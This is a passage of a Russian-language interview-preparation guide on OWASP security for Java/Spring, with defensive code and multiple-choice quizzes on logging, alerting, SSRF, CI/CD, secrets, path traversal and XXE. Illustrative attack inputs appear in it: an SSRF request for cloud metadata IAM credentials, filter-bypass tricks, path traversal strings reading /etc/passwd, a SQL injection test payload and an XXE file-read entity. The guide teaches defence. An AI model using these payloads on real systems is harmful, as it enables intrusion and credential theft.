> - [x] Обязательные security-события: попытки аутентификации (успех/неудача), отказы авторизации (AccessDenied), чувствительные операции (payment, admin actions), input validation failures; НЕ логировать пароли, токены, секреты, PII без необходимости. | Верный список. AOP-аспекты удобны для реализации: @AfterReturning на authenticate(), @AfterThrowing на @PreAuthorize, @Around на @AuditSensitive. Запрет логировать секреты — GDPR/compliance требование. Даже в маскированном виде токены не логируются (риск re-identification).
> - [ ] Обязательно логировать полный request body и response body каждого HTTP-запроса — это даёт полную картину для forensics анализа. | Полные body — это утечка данных через логи: пароли в login-endpoint, PII в user-endpoints, secrets в config-endpoints. Правильно — логировать метаданные (method, path, status, user, duration) + selective body для специфических endpoints (с маскированием чувствительных полей).
> - [ ] Логировать только успешные аутентификации; неудачные попытки логировать не нужно, так как они не влияют на безопасность системы. | Именно неудачные попытки — критичный security signal. Серия неудач = brute force или credential stuffing. Без этих логов невозможно детектировать активные атаки. Успешные логины тоже нужны (для audit trail), но failure events не менее важны.
> - [ ] Пароли в логах безопасны, если они захэшированы через MD5 перед записью; MD5 необратим и соответствует требованиям логирования. | Хэширование паролей в логах — бессмысленно и опасно. Злоумышленник, получивший логи, может атаковать хэши rainbow tables / brute force (особенно MD5). Правильно — пароли НЕ попадают в логи вообще (Logback MDC filter, Jackson @JsonIgnore на password-полях, маскирование в audit log).

## Q32. Как настроить алертинг на security-события?

Алертинг — ключевое отличие между «мы логируем» и «мы обнаруживаем атаки»:

```java
@Component
@RequiredArgsConstructor
public class SecurityAlertService {

    private final MeterRegistry meterRegistry;
    private final NotificationService notificationService;
    private final Cache<String, AtomicInteger> failedLoginCounter;

    @EventListener
    public void onAuthFailure(AuthenticationFailureEvent event) {
        String username = event.getAuthentication().getName();
        String ip = getClientIp();

        // Метрика для Prometheus/Grafana
        meterRegistry.counter("security.auth.failure",
            "username", username, "ip", ip).increment();

        // Детекция brute force — 10+ неудач за 5 минут
        AtomicInteger count = failedLoginCounter.get(ip, k -> new AtomicInteger(0));
        if (count.incrementAndGet() >= 10) {
            notificationService.sendAlert(
                AlertLevel.HIGH,
                "Brute force detected: 10+ failed logins from IP=" + ip);
        }
    }

    @EventListener
    public void onAccessDenied(AuthorizationDeniedEvent event) {
        // Алерт на попытку доступа к admin-ресурсам
        String resource = event.getSource().toString();
        if (resource.contains("/admin/")) {
            notificationService.sendAlert(
                AlertLevel.MEDIUM,
                "Admin access attempt by non-admin user");
        }
    }
}
```

Рекомендуемые метрики для дашбордов (подробнее в [вопросах по безопасности приложений](application-security-interview.md)):
- `security.auth.failure.rate` — аномальный рост = brute force
- `security.access_denied.rate` — аномальный рост = зондирование
- `security.input_validation.failure.rate` — аномальный рост = injection-попытки

> [!mcq]
> - [ ] Алертинг на security-события настраивается только на уровне SIEM (Splunk, ELK) — приложение не должно инициировать алерты, чтобы не создавать single point of failure. | Алертинг эффективнее всего на нескольких уровнях. Приложение быстрее детектирует конкретные паттерны (10 failed logins от IP за 5 мин), SIEM находит cross-app correlation. Spring Boot Events (AuthenticationFailureEvent, AuthorizationDeniedEvent) + Prometheus метрики + Alertmanager — стандартная архитектура.
> - [x] Алертинг на security-события: Spring Events (AuthenticationFailureEvent, AuthorizationDeniedEvent) → Prometheus-метрики (security.auth.failure.rate) → Alertmanager + отправка в SIEM; ключевой фактор — пороги (10+ failed logins за 5 мин = brute force). | Верная архитектура. Метрики дают quantitative signals для аномалий. Критично — настроить пороги, иначе false positives или missed alerts. Аномальный рост access_denied = зондирование, input_validation.failure = injection-попытки.
> - [ ] Главное в алертинге — отправлять алерт на email на КАЖДОЕ security-событие (каждую failed login); так security-команда не пропустит атаку. | Alert fatigue — реальная проблема: при 1000+ алертов в день команда игнорирует их (security-аналитики «выгорают»). Нужны пороги (N событий за время), severity levels (LOW/MEDIUM/HIGH/CRITICAL), группировка однотипных событий. Email тоже не лучший канал — PagerDuty/Opsgenie для on-call.
> - [ ] Алертинг избыточен при хорошем логировании: если все security-события залогированы, команда может анализировать их в квартальных security review. | Средний TTD breach — 287 дней. Квартальный анализ = минимум 90 дней задержки обнаружения. Real-time алертинг критичен для минимизации TTD. Логирование без алертинга — потенциал для forensics, но не для активного реагирования на атаки.

---

## Q33. (!) Что такое SSRF и почему он попал в OWASP Top 10?

`SSRF` (`Server-Side Request Forgery`, `A10:2021`) — **новая категория**, когда злоумышленник заставляет сервер выполнять запросы к произвольным адресам, включая внутренние сервисы.

Попал в Top 10 из-за роста cloud-инфраструктуры: через SSRF атакующий добирается до **metadata endpoints** (`169.254.169.254` в AWS/GCP), получает IAM-токены и компрометирует всю инфраструктуру.

```mermaid
sequenceDiagram
    participant Атакующий
    participant Сервер
    participant InternalService
    participant CloudMetadata

    Атакующий->>Сервер: GET /api/fetch?url=http://169.254.169.254/latest/meta-data/iam
    Сервер->>CloudMetadata: HTTP GET (от имени сервера!)
    CloudMetadata-->>Сервер: IAM credentials
    Сервер-->>Атакующий: IAM credentials (утечка!)
    Атакующий->>InternalService: Доступ с украденными credentials
```

**Типы SSRF:**
- **Classic SSRF** — ответ внутреннего сервиса возвращается атакующему
- **Blind SSRF** — ответ не виден, но факт запроса детектируется (OOB)
- **Partial SSRF** — контроль только над частью URL (path, параметры)

> [!mcq]
> - [ ] SSRF (`A10:2021`) — атака, заставляющая browser пользователя обращаться к внутренним сервисам. | Это CSRF, не SSRF. SSRF — атака через серверную сторону. ❌ ПОСЛЕДСТВИЕ: команда защищается CSRF-токенами (`SameSite=Strict` cookie), но эндпоинт `GET /api/fetch?url=...` пропускает любой URL → сервер сам идёт на metadata endpoint, утечка IAM-токенов.
> - [ ] SSRF — сервер ходит к metadata endpoint `172.16.0.1` с IAM-токенами. | Адрес неверный. AWS/GCP/Azure metadata = `169.254.169.254` (link-local). ❌ ПОСЛЕДСТВИЕ: команда блокирует `172.16.0.0/12` (private), но `169.254.169.254` остаётся доступен → `Capital One 2019` именно так получил IAM credentials через SSRF в WAF, утечка 100M записей.
> - [x] SSRF (`A10:2021`) — атака, заставляющая сервер выполнять запросы к произвольным адресам; критична в cloud из-за `169.254.169.254` (metadata, IAM-токены); защита — whitelist хостов и схем + блокировка link-local/loopback/site-local через `InetAddress.is*Address()`. | Получив IAM, атакующий компрометирует весь cloud-аккаунт. ✓ ПРИМЕНЯТЬ: AWS `IMDSv2` требует PUT-токен (защита от SSRF через GET); Kubernetes `NetworkPolicy` egress блокирует metadata. 📋 ПРАВИЛО: «Whitelist + block link-local + IMDSv2». 🔗 См. Q34, Q41, Q44.
> - [ ] SSRF защищается regex-валидацией URL на подстроки `192.168` и `127.0`. | Regex обходится: IPv6 loopback `::1`, decimal IP `http://2130706433/` (= `127.0.0.1`), DNS rebinding (домен резолвится в `169.254.169.254` после regex-проверки). ❌ ПОСЛЕДСТВИЕ: `Shopify SSRF 2018` (bug bounty) — обход регекса через DNS rebinding, доступ к internal services.

## Q34. Как реализовать защиту от SSRF в Java?

Многоуровневая защита:

```java
@Service
public class SafeUrlFetcher {

    private static final Set<String> ALLOWED_SCHEMES = Set.of("http", "https");
    private static final Set<String> ALLOWED_HOSTS = Set.of(
        "api.github.com", "api.example.com");

    public String fetch(String urlString) {
        // 1. Валидация URL
        URI uri = validateUrl(urlString);
        
        // 2. DNS-резолюция и проверка IP
        InetAddress address = resolveAndValidate(uri.getHost());
        
        // 3. Запрос с таймаутами
        return executeRequest(uri);
    }

    private URI validateUrl(String urlString) {
        URI uri;
        try {
            uri = new URI(urlString);
        } catch (URISyntaxException e) {
            throw new IllegalArgumentException("Invalid URL");
        }

        // Проверка схемы
        if (!ALLOWED_SCHEMES.contains(uri.getScheme())) {
            throw new SecurityException("Scheme not allowed: " + uri.getScheme());
        }

        // Whitelist хостов (предпочтительно)
        if (!ALLOWED_HOSTS.contains(uri.getHost())) {
            throw new SecurityException("Host not allowed: " + uri.getHost());
        }

        return uri;
    }

    private InetAddress resolveAndValidate(String host) {
        try {
            InetAddress addr = InetAddress.getByName(host);

            // Блокировка приватных и служебных диапазонов
            if (addr.isLoopbackAddress()         // 127.0.0.0/8
                || addr.isSiteLocalAddress()      // 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16
                || addr.isLinkLocalAddress()      // 169.254.0.0/16 (metadata endpoint!)
                || addr.isAnyLocalAddress()) {    // 0.0.0.0
                throw new SecurityException("Access to internal networks is forbidden");
            }
            return addr;
        } catch (UnknownHostException e) {
            throw new SecurityException("Cannot resolve host");
        }
    }
}
```

**Сетевой уровень** (defense in depth):
- `Network Policy` в Kubernetes — ограничить egress трафик подов
- `VPC Security Groups` / firewall — запретить обращение к metadata endpoint
- `IMDSv2` в AWS — требует PUT-запрос с `X-aws-ec2-metadata-token` (защита от SSRF через GET)

> [!mcq]
> - [ ] SSRF защищается regex на подстроки `169.254`, `127.0`, `localhost` в URL. | Обходится: IPv6 `::1`, decimal IP, DNS rebinding. ❌ ПОСЛЕДСТВИЕ: `Shopify SSRF 2018` — DNS rebinding обошёл regex; домен `evil.com` резолвится в `1.2.3.4` для проверки, потом в `169.254.169.254` для запроса.
> - [ ] Защита от SSRF в Java не нужна — `SecurityManager` блокирует private IP. | `SecurityManager` deprecated for removal в Java 17+. `HttpClient`/`RestTemplate`/`OkHttp` не блокируют private IP. ❌ ПОСЛЕДСТВИЕ: команда полагается на «JVM защитит», в Spring Boot 3 (Java 17) `RestTemplate.getForObject(userUrl, ...)` идёт на metadata endpoint без проверок.
> - [ ] `IMDSv2` в AWS — улучшенный metadata с SSL; обычные HTTP-клиенты SSL не поддерживают. | `IMDSv2` использует HTTP, не SSL. Защита — PUT-токен с TTL (`X-aws-ec2-metadata-token`). ❌ ПОСЛЕДСТВИЕ: команда мигрирует на `IMDSv2` думая о SSL и не отключает `IMDSv1` (`http-tokens=optional`); SSRF через GET всё ещё крадёт credentials через legacy IMDSv1.
> - [x] Защита от SSRF: whitelist хостов и схем (`http`/`https`), блокировка loopback/site-local/link-local через `InetAddress.is*Address()`, K8s `NetworkPolicy`/VPC SG для egress, AWS `IMDSv2` (PUT-токен). | Многослойная защита. ✓ ПРИМЕНЯТЬ: GitHub Enterprise SSRF protection — whitelist + DNS-resolution check; AWS `IMDSv2` обязателен в EKS-кластерах. 📋 ПРАВИЛО: «Whitelist + DNS-check + egress-firewall + IMDSv2». 🔗 См. Q33, Q35, Q41.

---

## Q35. (!) Как встроить OWASP-проверки в SDLC и CI/CD?

OWASP-риски покрываются не одним пентестом, а системой автоматических и ручных проверок на каждом этапе:

```mermaid
graph LR
    A[Design] --> B[Development]
    B --> C[CI/CD]
    C --> D[Staging]
    D --> E[Production]
    
    A -.-> A1[Threat Modeling]
    A -.-> A2[Security Requirements]
    B -.-> B1[Code Review]
    B -.-> B2[IDE Plugins]
    C -.-> C1[SAST]
    C -.-> C2[SCA]
    C -.-> C3[Secret Scan]
    C -.-> C4[IaC Scan]
    D -.-> D1[DAST]
    D -.-> D2[Pentest]
    E -.-> E1[WAF]
    E -.-> E2[Monitoring]
    E -.-> E3[Bug Bounty]
```

**Практический CI/CD pipeline:**

| Стадия | Инструмент | Что проверяет | Блокирует MR? |
|--------|-----------|---------------|---------------|
| `SAST` | `SpotBugs` + `Find Security Bugs` | SQL injection, XSS, криптография | Да, на High |
| `SCA` | `OWASP Dependency-Check` | Уязвимые зависимости | Да, на CVSS ≥ 7.0 |
| `Secrets` | `gitleaks`, `trufflehog` | Утечка секретов в код | Да, всегда |
| `IaC` | `Checkov`, `tfsec` | Ошибки конфигурации | Да, на High |
| `Container` | `Trivy` | Уязвимости в образах | Да, на Critical |
| `DAST` | `OWASP ZAP` | Runtime-уязвимости | Нет (информационно) |

Важно определить **quality gates** — по severity и с возможностью policy exception с явным владельцем риска.

> [!mcq]
> - [x] OWASP-проверки в CI/CD: SAST (SpotBugs + Find Security Bugs) — блок на High; SCA (OWASP Dependency-Check) — блок на CVSS ≥ 7.0; Secret Scan (gitleaks) — всегда блок; IaC (Checkov); Container (Trivy) — блок на Critical; DAST (ZAP) — информационно. Threat modeling на этапе Design. | Верное distribution по стадиям SDLC. SAST находит injection в коде, SCA — уязвимые зависимости, Secret Scan — утечку токенов в git, IaC Scan — ошибки K8s/Terraform. Quality gates с policy exception через явный owner риска.
> - [ ] Достаточно одного DAST-сканирования (OWASP ZAP) в production — он найдёт все OWASP Top 10 уязвимости и заменит SAST, SCA, Secret Scan. | DAST находит только runtime-уязвимости в работающем приложении (XSS, missing security headers), но не SQL Injection в неиспользуемых endpoints, не IDOR без test data, не secrets в коде, не уязвимые dependencies. DAST дополняет SAST/SCA, не заменяет.
> - [ ] OWASP-проверки применяются только на стадии Production (WAF + Monitoring); на стадиях Development и CI/CD это избыточно, так как код ещё не эксплуатируется. | Shift-left — основной принцип: находить проблемы как можно раньше. Баг, найденный на Design через threat modeling, стоит в 100x дешевле, чем на Production. CI/CD проверки (SAST, SCA, Secret Scan) — обязательный минимум для Senior-уровня команды.
> - [ ] Quality gates в CI/CD должны блокировать MR на ЛЮБОЙ finding (Low severity тоже): это гарантирует чистый код. | Это создаёт alert fatigue и блокирует разработку на false positives. Стандартный подход: блок на High/Critical (с CVSS threshold), Medium — создание задачи с SLA 30 дней, Low — backlog. Blocking на Low — контрпродуктивно: разработчики начинают обходить security.

## Q36. Какие security-тесты обязательны перед релизом?

Минимальный набор security-тестов в Java-проекте:

```java
// 1. Тесты авторизации — positive + negative
@Test
void regularUser_cannotAccessAdminEndpoint() {
    mockMvc.perform(get("/api/admin/users")
            .with(user("regular").roles("USER")))
        .andExpect(status().isForbidden());
}

@Test
void admin_canAccessAdminEndpoint() {
    mockMvc.perform(get("/api/admin/users")
            .with(user("admin").roles("ADMIN")))
        .andExpect(status().isOk());
}

// 2. Тесты на IDOR
@Test
void user_cannotAccessOtherUsersData() {
    mockMvc.perform(get("/api/accounts/999")  // чужой аккаунт
            .with(user("user1").roles("USER")))
        .andExpect(status().isForbidden());
}

// 3. Тесты на injection
@Test
void sqlInjection_doesNotWork() {
    mockMvc.perform(get("/api/users")
            .param("search", "' OR '1'='1"))
        .andExpect(status().isBadRequest());
}

// 4. Тесты security headers
@Test
void securityHeaders_arePresent() {
    mockMvc.perform(get("/api/public/health"))
        .andExpect(header().string("X-Content-Type-Options", "nosniff"))
        .andExpect(header().string("X-Frame-Options", "DENY"))
        .andExpect(header().exists("Content-Security-Policy"));
}
```

Для критичных систем добавляют threat-based тесты по наиболее вероятным атакам из threat model (см. Q16).

> [!mcq]
> - [ ] Обязательные security-тесты — это только unit-тесты бизнес-логики с правильным happy path; negative тесты (forbidden/invalid input) избыточны при правильной реализации. | Security-тесты — это именно negative-тесты: «что будет, если non-admin обратится к admin-endpoint», «что будет, если SQL injection payload попадёт в search». Happy path не проверяет security. Negative-тесты обязательны для авторизации (регулярный user vs admin endpoint) и injection.
> - [x] Обязательные security-тесты: authorization positive+negative (regular user vs admin), IDOR-тесты (доступ к чужим ресурсам), injection-тесты (SQL payloads), проверка security headers (X-Frame-Options, CSP, HSTS), threat-based тесты по threat model. | Верный минимум. MockMvc с user().roles() удобен для authorization-тестов. IDOR — отдельный кейс: пользователь A обращается к ресурсу пользователя B, ожидается 403. Security headers проверяются как обычные HTTP-заголовки в тестах.
> - [ ] Достаточно запустить OWASP ZAP в CI/CD; ручные security-тесты в коде приложения не нужны, так как ZAP покрывает все OWASP Top 10. | ZAP — DAST-инструмент: находит runtime-уязвимости, но не IDOR без тестовых пользователей, не все authorization paths, не business logic bugs. Код-уровневые unit-тесты безопасности нужны как первая линия — выполняются быстро при каждом MR.
> - [ ] Security-тесты должны прогоняться только перед major-релизом (раз в квартал); на каждый MR — избыточно и замедляет разработку. | Security-тесты должны запускаться на каждый MR в рамках обычного test suite. MockMvc-тесты выполняются за миллисекунды. Откладывание до major-релиза = регрессии попадают в production. Принцип shift-left: ранее = дешевле и безопаснее.

## Q37. Как организовать безопасный секрет-менеджмент?

Секреты **не должны** храниться в коде, `application.yml`, Docker-образах или переменных окружения (env vars видны в `/proc`).

**Иерархия подходов (от простого к надёжному):**

| Подход | Плюсы | Минусы |
|--------|-------|--------|
| Env vars | Просто, нет в коде | Видны в `/proc`, нет аудита |
| `Spring Config Server` (encrypted) | Централизация | Ключ шифрования нужно где-то хранить |
| `HashiCorp Vault` | Ротация, аудит, lease | Сложность настройки |
| Cloud KMS (`AWS Secrets Manager`, `GCP Secret Manager`) | Managed, аудит, ротация | Vendor lock-in |

```java
// Spring Cloud Vault — динамические секреты БД
@Configuration
public class VaultConfig {
    // spring.cloud.vault.database.enabled=true
    // Vault генерирует временные DB credentials с TTL
    // При истечении — автоматическая ротация
}
```

Ключевые правила:
- Секрет **никогда** не попадает в git (настроить `pre-commit hook` с `gitleaks`)
- Секреты **разные** для каждого окружения (dev/staging/prod)
- **Ротация** — автоматическая, с минимальным TTL
- **Аудит** — кто, когда и к какому секрету обращался
- Минимизировать **время жизни** секрета в памяти приложения

> [!mcq]
> - [x] Безопасный секрет-менеджмент: секреты не в коде/yml/Docker, иерархия подходов от простого (env vars) до надёжного (HashiCorp Vault / AWS Secrets Manager с динамическими секретами БД + TTL); pre-commit hook (gitleaks), аудит доступа, разные секреты на dev/staging/prod. | Верная стратегия. Vault + Spring Cloud Vault даёт dynamic secrets: временные DB credentials с TTL, автоматическая ротация. Env vars — базовый уровень (лучше чем git), но без аудита и ротации. Cloud KMS — managed решение с аудитом.
> - [ ] Секреты можно безопасно хранить в application.yml, если файл зашифрован через Ansible Vault или Jasypt: шифрование делает их защищёнными от git-leak. | Зашифрованные секреты в git = ключ шифрования где-то должен быть (обычно в env или в yml), что возвращает проблему. Ansible/Jasypt полезны как доп. слой, но не решают проблему. Правильно — секреты вне репозитория: Vault, Secret Manager, K8s Secrets.
> - [ ] Environment variables — самый безопасный способ хранения секретов: они изолированы процессом и недоступны другим процессам в системе. | Env vars видны в /proc/<pid>/environ, docker inspect, kubectl describe pod, ps aux. Нет аудита доступа, нет ротации, секреты попадают в core dumps и stack traces. Env vars — базовый уровень, Vault/KMS значительно безопаснее.
> - [ ] Ротация секретов необязательна, если секрет достаточно сложный (минимум 32 символа случайных byte): сложность компенсирует отсутствие ротации. | Сложность защищает от brute force, но не от утечки (через логи, dumps, insider threat). Ротация ограничивает окно атаки при компрометации: украденный секрет действителен до следующей ротации. Vault позволяет TTL 1-24 часа с автоматической ротацией — best practice.

## Q38. Как приоритизировать исправление уязвимостей?

Приоритет определяется **бизнес-контекстом**, не только `CVSS`:

```mermaid
graph TD
    A[Уязвимость обнаружена] --> B{CVSS score}
    B -->|9-10 Critical| C{Эксплуатируемая?}
    B -->|7-8.9 High| D{Публичный сервис?}
    B -->|4-6.9 Medium| E[SLA: 30 дней]
    B -->|0-3.9 Low| F[Backlog]
    
    C -->|Да| G[Немедленно<br/>SLA: 24 часа]
    C -->|Нет| H[SLA: 7 дней]
    D -->|Да| I[SLA: 7 дней]
    D -->|Нет| J[SLA: 30 дней]
```

**Факторы приоритизации:**
- **Exploitability** — есть ли публичный эксплойт?
- **Attack surface** — публичный API vs внутренний сервис
- **Data sensitivity** — финансовые данные vs публичный контент
- **Compensating controls** — WAF, network isolation, monitoring
- **Blast radius** — что будет скомпрометировано при эксплуатации

> Иногда «Medium» уязвимость в публичном API важнее «Critical» во внутреннем сервисе за VPN.

Практичный подход — **risk-based backlog** с SLA по severity и owner на каждую запись.

> [!mcq]
> - [ ] Приоритизация уязвимостей делается строго по CVSS score: Critical (9-10) исправляются за 24 часа, High (7-8.9) за неделю, Medium (4-6.9) за месяц, Low (0-3.9) — backlog. | CVSS — только один фактор. Business-контекст не менее важен: Medium в публичном API (exploitable, attack surface high, data sensitive) важнее Critical во внутреннем сервисе за VPN (compensating controls: network isolation). Reasonable heuristic, но не единственный.
> - [x] Приоритизация по бизнес-контексту: CVSS + exploitability (есть ли публичный эксплойт), attack surface (публичный vs внутренний), data sensitivity (PII/financial vs публичный контент), compensating controls (WAF, network isolation), blast radius; risk-based backlog с SLA и owner. | Верный подход. «Medium в публичном API важнее Critical во внутреннем сервисе за VPN» — классический пример. Exploitability повышает priority: уязвимость с PoC эксплойтом требует немедленной реакции независимо от CVSS.
> - [ ] Все уязвимости независимо от severity должны быть исправлены за 24 часа; ожидание 30 дней на Medium CVE создаёт окно атаки. | Это нереалистично и контрпродуктивно. 100+ Medium CVE в месяц = команда не успевает делать ничего кроме security-fixes. Risk-based prioritization — компромисс: Critical/High — немедленно, Medium — SLA 30 дней, Low — backlog. Баланс между security и delivery.
> - [ ] Уязвимости во внутренних сервисах не нужно исправлять: network isolation и VPN полностью защищают от эксплуатации. | Insider threat и lateral movement — реальные сценарии. Скомпрометированный internal service используется как pivot для атаки соседних сервисов (например, после SSRF в публичном сервисе). Defense in depth: фиксить уязвимости независимо от network isolation, но с разным приоритетом.

## Q39. Что такое Defense in Depth и как применять на практике?

`Defense in Depth` — принцип многоуровневой защиты, где каждый слой работает независимо. Если один слой пробит, следующий всё ещё защищает:

```mermaid
graph TB
    subgraph "Уровни защиты"
        A[WAF / CDN] --> B[Network / Firewall]
        B --> C[Load Balancer / TLS]
        C --> D[API Gateway / Rate Limiting]
        D --> E[Spring Security Filter Chain]
        E --> F["@PreAuthorize на методах"]
        F --> G[Business Logic Validation]
        G --> H[Row Level Security в БД]
    end
```

**Пример — защита API перевода денег:**

```java
// Слой 1: URL-авторизация (SecurityFilterChain)
.requestMatchers("/api/transfers/**").authenticated()

// Слой 2: метод-авторизация
@PreAuthorize("hasRole('USER') and #request.fromAccountId == authentication.principal.accountId")
public TransferResult transfer(TransferRequest request) { ... }

// Слой 3: бизнес-валидация
if (fromAccount.getBalance().compareTo(amount) < 0) {
    throw new InsufficientFundsException();
}
if (amount.compareTo(fromAccount.getDailyLimit()) > 0) {
    throw new DailyLimitExceededException();
}

// Слой 4: аудит
auditService.log("TRANSFER", fromAccount, toAccount, amount);

// Слой 5: БД constraints
// CHECK (balance >= 0) на уровне таблицы
```

Каждый слой защищает от разных сценариев и от ошибок в других слоях.

> [!mcq]
> - [x] Defense in Depth — многоуровневая защита, где каждый слой работает независимо: WAF/CDN → Network/Firewall → API Gateway rate limit → Spring Security Filter Chain → @PreAuthorize → business logic validation → Row Level Security в БД. | Верное применение. При пробитии одного слоя следующий всё ещё защищает. Пример — защита API перевода денег: URL-auth + @PreAuthorize + business-rules (daily limit) + audit + DB CHECK constraint на balance. 5 слоёв от разных сценариев ошибок.
> - [ ] Defense in Depth — это избыточная защита: если URL-авторизация настроена правильно, @PreAuthorize на методах и ownership-проверка в сервисе дублируют одну и ту же логику. | Это не дублирование, а разные слои защиты. URL-auth работает на request level, @PreAuthorize — на method level (работает для не-HTTP вызовов), ownership-проверка — на business level. Каждый слой защищает от разных ошибок: если забыли URL-правило, @PreAuthorize спасёт.
> - [ ] Defense in Depth применяется только в legacy-системах; современные Zero Trust архитектуры делают многоуровневую защиту ненужной. | Zero Trust — это как раз Defense in Depth в network architecture: вместо «внутри VPN всё доверено» каждый запрос проверяется независимо от источника. Zero Trust дополняет, а не заменяет DiD на уровне приложения (auth, business validation, DB constraints).
> - [ ] Defense in Depth — это только network-уровень (WAF + firewall + VPN); на application-уровне достаточно одного слоя защиты для упрощения архитектуры. | DiD применяется на всех уровнях: network (WAF, firewall), application (auth + method security + business validation), data (RLS, encryption at rest). Application-уровень с одним слоем = single point of failure: ошибка в этом слое делает систему полностью уязвимой.

## Q40. Как подготовиться к вопросам по OWASP на собеседовании?

**Что ожидают от Senior Java Developer:**

1. **Знание всех 10 категорий** — не наизусть определения, а понимание: почему это проблема, как проявляется в Java/Spring, как защищаться
2. **Практический опыт** — конкретные примеры из своих проектов: «мы нашли IDOR в API заказов и исправили через PermissionEvaluator»
3. **Код** — умение написать и уязвимый, и исправленный вариант
4. **Процесс** — как security встроен в SDLC, CI/CD, code review
5. **Trade-offs** — понимание, что безопасность имеет цену (сложность, производительность, UX)

**Структура ответа на вопрос типа «Расскажите про A01»:**
1. Что это (1-2 предложения)
2. Пример уязвимости (код или сценарий)
3. Как защищаться (конкретные меры)
4. Как проверять (тесты, инструменты)

**Частые ловушки:**
- «Мы используем Spring Security, значит защищены» — нет, `Spring Security` защищает аутентификацию и URL-авторизацию, но не от IDOR, injection в native queries, SSRF
- «У нас есть WAF» — WAF — дополнительный слой, но не замена правильного кода
- «Мы шифруем пароли через MD5/SHA-256» — это хэширование, не шифрование, и оба варианта небезопасны для паролей

> [!mcq]
> - [ ] На собеседовании достаточно наизусть перечислить 10 категорий OWASP Top 10 2021 с официальными названиями — это демонстрирует знание стандарта. | Перечисление названий — junior-уровень. Senior должен объяснить: почему эта категория — проблема, как проявляется в Java/Spring, как защищаться, как проверять. «Мы используем Spring Security» — типичная ловушка: оно защищает URL-auth, но не от IDOR, SQL injection в native queries, SSRF.
> - [x] На собеседовании Senior ожидают: понимание всех 10 категорий (не наизусть, а в контексте Java/Spring), конкретные примеры из проектов ("нашли IDOR в API заказов через PermissionEvaluator"), умение написать и уязвимый, и исправленный код, процесс (SDLC, CI/CD, code review), trade-offs. | Верный подход. Структура ответа: что это → пример уязвимости → как защищаться → как проверять. Избегать ловушек: «у нас есть WAF» = доп. слой, не замена. «Шифруем через MD5» = это хэширование, и оба небезопасны.
> - [ ] На собеседовании по OWASP ожидают детального знания CVSS-скора каждой категории (например, A01 имеет CVSS 9.8) — без цифр ответ считается поверхностным. | CVSS применяется к конкретным CVE, а не к категориям OWASP. Senior должен объяснить методологию OWASP (Likelihood × Impact, data-driven для 8 категорий + survey для 3), но не CVSS «категорий». Ловушка в вопросе — если спрашивают CVSS категорий, собеседующий путается.
> - [ ] Достаточно выучить ответы на 10 типовых вопросов; глубокое понимание архитектуры безопасности не требуется для Senior-роли. | Senior Java Developer должен владеть архитектурными concepts: threat modeling, defense in depth, secure SDLC, secrets management, cryptographic best practices. Интервьюер проверяет именно понимание, не заученные ответы — через follow-up вопросы и практические сценарии.

## Q41. (!) Как реализовать Path Traversal защиту в Java?

**Path Traversal** (CWE-22) — атака, при которой злоумышленник использует последовательности `../` для выхода за пределы разрешённого каталога.

### Уязвимый код

```java
// УЯЗВИМО: прямое использование имени файла из запроса
@GetMapping("/files/{filename}")
public ResponseEntity<Resource> downloadFile(@PathVariable String filename) {
    Path filePath = Paths.get("/var/uploads/" + filename);
    Resource resource = new FileSystemResource(filePath);
    return ResponseEntity.ok(resource);
}
// Атака: GET /files/../../etc/passwd
```

### Безопасная реализация

```java
@GetMapping("/files/{filename}")
public ResponseEntity<Resource> downloadFile(@PathVariable String filename) {
    // 1. Нормализуем путь
    Path baseDir = Paths.get("/var/uploads").toAbsolutePath().normalize();
    Path requestedFile = baseDir.resolve(filename).normalize();

    // 2. Проверяем, что путь не выходит за пределы базовой директории
    if (!requestedFile.startsWith(baseDir)) {
        throw new ResponseStatusException(HttpStatus.BAD_REQUEST, "Invalid file path");
    }

    // 3. Проверяем существование файла
    if (!Files.exists(requestedFile) || !Files.isRegularFile(requestedFile)) {
        throw new ResponseStatusException(HttpStatus.NOT_FOUND);
    }

    // 4. Дополнительно: whitelist допустимых расширений
    String ext = FilenameUtils.getExtension(filename).toLowerCase();
    if (!Set.of("pdf", "png", "jpg", "jpeg").contains(ext)) {
        throw new ResponseStatusException(HttpStatus.BAD_REQUEST, "Unsupported file type");
    }

    Resource resource = new FileSystemResource(requestedFile);
    return ResponseEntity.ok()
        .header(HttpHeaders.CONTENT_DISPOSITION,
            "attachment; filename=\"" + requestedFile.getFileName() + "\"")
        .body(resource);
}
```

### Ключевые меры защиты

| Мера | Реализация |
|------|-----------|
| Нормализация пути | `path.normalize()` убирает `../` |
| Проверка `startsWith` | Гарантирует нахождение в разрешённом каталоге |
| Whitelist расширений | Запрет опасных типов файлов |
| Хранение вне `webroot` | Файлы не доступны напрямую через веб |
| UUID-именование | Замена оригинальных имён на UUID при сохранении |

> [!mcq]
> - [ ] Path Traversal защищается заменой `"../"` на `""` через `String.replace()`. | Тривиально обходится: double encoding (`%2e%2e%2f`), `....//` (после удаления `../` остаётся `../`), Unicode (`%c0%ae%c0%ae/`). ❌ ПОСЛЕДСТВИЕ: `CVE-2021-41773` Apache HTTP Server — path traversal через `%2e` обход similar string-replace, RCE на десятках тысяч публичных серверов.
> - [ ] Path Traversal — проблема только старых серверов (Apache, IIS); Spring Boot защищён. | Spring Boot НЕ защищает автоматически. ❌ ПОСЛЕДСТВИЕ: `@PathVariable String filename` + `new FileSystemResource("/var/uploads/" + filename)` уязвим в любой версии Spring Boot; `GET /files/..%2F..%2Fetc%2Fpasswd` читает `/etc/passwd`.
> - [ ] Path Traversal защищается whitelist расширений файлов (`.pdf`, `.png`); если расширение разрешено, файл безопасен. | Whitelist — дополнительный слой, не основной. `../../etc/passwd.pdf` тоже валиден по whitelist. ❌ ПОСЛЕДСТВИЕ: разработчик считает `endsWith(".pdf")` достаточным; symlink из `uploads/file.pdf` → `/etc/shadow.pdf` читает чужие данные.
> - [x] Path Traversal (CWE-22) предотвращается `path.normalize()` + `requestedFile.startsWith(baseDir)`; normalize убирает `../`, startsWith гарантирует нахождение в каталоге; дополнительно — whitelist расширений, UUID-именование, хранение вне webroot. | ✓ ПРИМЕНЯТЬ: GitHub использует UUID-имена для uploads + S3 storage (`avatars.githubusercontent.com`); Spring Boot Resource Handling уже использует startsWith-check внутри. 📋 ПРАВИЛО: «`normalize()` + `startsWith(baseDir)` обязательны». 🔗 См. Q11, Q14, Q43.

## Q42. Что такое XXE и как защититься в Java?

**XXE** (XML External Entity Injection, CWE-611) — атака через XML-парсер, который обрабатывает внешние сущности. Позволяет читать локальные файлы, делать SSRF, в редких случаях — RCE.

### Пример атаки

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
